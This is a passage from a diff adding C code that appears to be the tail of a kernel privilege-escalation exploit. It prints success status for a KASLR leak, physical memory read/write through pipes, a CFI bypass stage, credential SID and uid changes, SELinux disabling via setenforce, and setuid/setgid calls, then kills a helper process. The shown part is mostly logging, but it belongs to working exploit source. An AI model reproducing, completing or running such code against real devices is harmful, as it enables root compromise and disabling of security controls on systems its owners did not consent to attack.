+             getpid(), atomic_load(&cfi_stage_done), root_child_done,
+             kaslr_done, kaslr_base, kaslr_slide);
+  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
+             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
+             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
+             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
+             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
+             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
+             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
+             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
+  if (pipe_prepare_child > 0) {
+    SYSCHK(kill(pipe_prepare_child, SIGKILL));
+    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
+  }
+  sleep(5);
+  return 0;
+}
